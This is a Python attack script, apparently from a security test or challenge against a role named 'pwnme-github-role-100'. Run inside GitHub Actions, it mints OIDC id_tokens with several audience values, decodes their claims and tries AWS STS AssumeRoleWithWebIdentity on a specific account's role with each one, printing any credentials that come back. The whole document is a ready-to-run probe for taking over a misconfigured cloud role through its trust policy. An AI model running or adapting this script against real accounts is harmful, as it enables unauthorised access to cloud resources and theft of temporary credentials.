#!/usr/bin/env python3
"""prl-t1 i4168 audience sweep: mint GitHub Actions id_tokens with several audiences and test
sts:AssumeRoleWithWebIdentity against the target role arn:aws:iam::941377144061:role/pwnme-github-role-100."""
import json, os, base64, re, urllib.request, urllib.parse

ROLE='arn:aws:iam::941377144061:role/pwnme-github-role-100'

def mint(aud):
    u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
    if not u or not t: raise RuntimeError('oidc env missing')
    url=u + ('&' if '?' in u else '?') + ('audience='+urllib.parse.quote(aud,safe='') if aud is not None else '')
    req=urllib.request.Request(url, headers={'Authorization':'Bearer '+t,'Accept':'application/json','User-Agent':'prl-t1'})
    return json.loads(urllib.request.urlopen(req,timeout=30).read())['value']

def claims(tok):
    p=tok.split('.')[1]; p+='='*(-len(p)%4)
    d=json.loads(base64.urlsafe_b64decode(p))
    return {k:d.get(k) for k in ('iss','sub','aud','repository','ref')}

def assume(role, tok):
    data=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'prl-t1','WebIdentityToken':tok}).encode()
    try:
        r=urllib.request.urlopen('https://sts.amazonaws.com/',data,timeout=40)
        return 'OK %s %s'%(r.status, r.read().decode()[:2500])
    except Exception as e:
        body=getattr(e,'read',lambda:b'')().decode()
        code=re.search(r'<Code>([^<]+)</Code>', body); msg=re.search(r'<Message>([^<]+)</Message>', body)
        return 'ERR %s code=%s msg=%s'%(e, code.group(1) if code else '', (msg.group(1) if msg else body[:200]))

for aud in (None,'sts.amazonaws.com','https://github.com/picxbed','https://github.com/dakshisdakshs','https://github.com/utsav-simplismart','sigstore'):
    try:
        tok=mint(aud); c=claims(tok); res=assume(ROLE,tok)
        print('RESULT AUD %r %s'%(aud, json.dumps({'aud_claim':c.get('aud'),'sub':c.get('sub'),'repo':c.get('repository'),'result':res}, sort_keys=True)), flush=True)
    except Exception as e:
        print('RESULT AUD %r EXC %s'%(aud, str(e)[:300]), flush=True)
print('RESULT DONE ok', flush=True)
